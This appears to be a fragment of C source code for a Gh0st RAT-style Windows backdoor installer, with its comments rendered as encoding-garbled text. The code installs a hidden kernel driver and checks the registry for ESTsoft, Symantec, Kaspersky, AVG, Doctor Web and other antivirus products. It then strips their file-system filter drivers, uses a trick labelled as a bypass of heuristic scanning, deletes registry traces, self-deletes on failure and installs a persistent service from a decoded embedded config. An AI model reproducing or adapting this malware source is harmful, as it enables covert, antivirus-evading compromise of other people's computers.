			InstallDriverFormServices(hSCManager,"PDCOMPB",szDriverPath,TRUE);
			if (CheckDriverInstall() == FALSE)
			{
				return FALSE;
			}
		}
	}
	SetFileAttributes(szDriverPath,FILE_ATTRIBUTE_HIDDEN);

	if(RegOpenKeyEx(hkESTsoft,"SOFTWARE\\ESTsoft", 0, KEY_QUERY_VALUE, &hkESTsoft) == ERROR_SUCCESS)
	{
		OutputDebugToFile("ESTsoft @update");
		RegCloseKey(hkESTsoft);
		CallMyDrivers("-ESTsoft","fuckESTsoft");  //
		//CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //�����Сҩ�裬��ժ���ļ���������

	}else
	{
		memset(szPid,0,sizeof(szPid));
		wsprintf(szPid,"%d",GetCurrentProcessId());
		CallMyDrivers("-hook",szPid);
	}

	//ɾ��ע�������360��ɱ
	HKEY	hKey0;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\PDCOMP",NULL,\
		KEY_WRITE,&hKey0) == ERROR_SUCCESS)
	{
		RegDeleteValue(hKey0,"ImagePath");
		RegCloseKey(hKey0);
	}
	if(RegOpenKeyEx(hkRoot2,"SOFTWARE\\Symantec", 0, KEY_QUERY_VALUE, &hkRoot2) == ERROR_SUCCESS) //�ж��Ƿ�����������ˣ��Ա�ժ����������
	{
		OutputDebugToFile("Clearfilers @FileSystem");
		CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //������������ˣ���ժ���ļ���������
		RegCloseKey(hkRoot2);
	}
	if(RegOpenKeyEx(hkRoot3,"SOFTWARE\\Doctor Web", 0, KEY_QUERY_VALUE, &hkRoot3) == ERROR_SUCCESS) //�ж��Ƿ���ڴ�֩�룬�Ա�ժ����������
	{
		OutputDebugToFile("Clearfilers @FileSystem");
		CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //����Ǵ�֩�룬��ժ���ļ���������
		RegCloseKey(hkRoot3);
	}
	if(RegOpenKeyEx(hkRoot4,"SOFTWARE\\KasperskyLab", 0, KEY_QUERY_VALUE, &hkRoot4) == ERROR_SUCCESS) //�ж��Ƿ����KasperskyLab���Ա�ժ����������
	{
		OutputDebugToFile("Clearfilers @FileSystem");
		CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //�����KasperskyLab����ժ���ļ���������
		RegCloseKey(hkRoot4);
	}
	if(RegOpenKeyEx(hkRoot5,"SOFTWARE\\Avg", 0, KEY_QUERY_VALUE, &hkRoot5) == ERROR_SUCCESS) //�ж��Ƿ����avg���Ա�ժ����������
	{
		OutputDebugToFile("Clearfilers @FileSystem");
		CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //�����avg����ժ���ļ���������
		RegCloseKey(hkRoot5);
	}
	if(RegOpenKeyEx(hkRoot6,"SYSTEM\\CurrentControlSet\\Services\\spidernt", 0, KEY_QUERY_VALUE, &hkRoot6) == ERROR_SUCCESS) //�ж��Ƿ�������𽢣��Ա�ժ����������
	{
		OutputDebugToFile("Clearfilers @Spidernt_FileSystem");
		CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //��������𽢣���ժ���ļ���������
		RegCloseKey(hkRoot6);
	}
	return TRUE;
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{

	GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);
	//////////////////////////////////////////////////////////////////////////
	char	*lpEncodeString = NULL;
	char	*lpServiceConfig = NULL;
	char	*lpServiceDisplayName = NULL;
	char	*lpServiceDescription = NULL;

	//bypass��������ʽɨ��,kav(2009,2010),eset(3.0 ~ 4.0)
        //����һ�д��룬�ؼ���λ���룬��������°�  :)
	if(WinExec("net.exe",SW_HIDE) <= Heuristic)
	{
		OutputDebugToFile("Heuristic scanning behavior was found!\r\n");
		return 0;
	}
	hInstall = InstallDriver();
	if (hInstall == FALSE)
	{
		OutputDebugToFile("Load driver fails, the program exit and automatically removed!\r\n");
		DeleteMe();
		return 0;
	}else if (hInstall == HadBeenInstalled)
	{
		OutputDebugToFile("Driver had been loaded!\r\n");
		//DeleteMe();
		//return 0;
	}else if (hInstall == HadBeenInstalledDriverAndNor)
	{
		OutputDebugToFile("HadBeenInstalledDriverAndNor!\r\n");
	}
	lpEncodeString = (char *)FindConfigString(hInstance, "AAAAAA");
	if (lpEncodeString == NULL)
		return -1;

	lpServiceConfig = (char *)FindConfigString(hInstance, "CCCCCC");  //�������FindConfigStringҲ����������
	if (lpServiceConfig == NULL)
		return -1;
	char	*pos = strchr(lpServiceConfig, '|');
	if (pos == NULL)
		return -1;
	*pos = '\0';
	lpServiceDisplayName = MyDecode(lpServiceConfig + 6);
	lpServiceDescription = MyDecode(pos + 1);                        //�������MyDecode����������
	if (lpServiceDisplayName == NULL || lpServiceDescription == NULL)
		return -1;

	char	*lpServiceName = NULL;
	char	*lpUpdateArgs = "Gh0st Update";

	//////////////////////////////////////////////////////////////////////////
	// ������Ǹ��·����
	if (strstr(GetCommandLine(), lpUpdateArgs) == NULL)
	{
		if (hInstall == HadBeenInstalled)
		{
			char lpMutex[256] = {0};
			wsprintf(lpMutex, "Global\\Gh0st %d", GetTickCount()); // ����¼���
			HANDLE	hMutex = CreateMutex(NULL, true,lpMutex);
			DWORD	dwLastError = GetLastError();
			// ��ͨȨ�޷���ϵͳȨ�޴�����Mutex,������ڣ�������ھͷ��ؾܾ����ʵĴ���
			// �Ѿ���װ��һ��һģһ�����õģ��Ͳ���װ��
			if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED)
				return -1;
			ReleaseMutex(hMutex);
			CloseHandle(hMutex);
			goto Next;
		}
		HANDLE	hMutex = CreateMutex(NULL, true, lpEncodeString);
		DWORD	dwLastError = GetLastError();
		// ��ͨȨ�޷���ϵͳȨ�޴�����Mutex,������ڣ�������ھͷ��ؾܾ����ʵĴ���
		// �Ѿ���װ��һ��һģһ�����õģ��Ͳ���װ��
		if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED)
			return -1;
		ReleaseMutex(hMutex);
		CloseHandle(hMutex);
	}
	else
	{
		// �ȴ��������ɾ��
		Sleep(5000);
	}
Next:
	SetUnhandledExceptionFilter(bad_exception);
	
	// ȷ��Ȩ��
//	SetAccessRights();             //���������NOD32 ����,ò���������ûʲô�ô�

	lpServiceName = InstallService(lpServiceDisplayName, lpServiceDescription, lpEncodeString);  //�������Ҳ��NOD32 ����,������ɱ����
	
	ExitProcess(0);
}
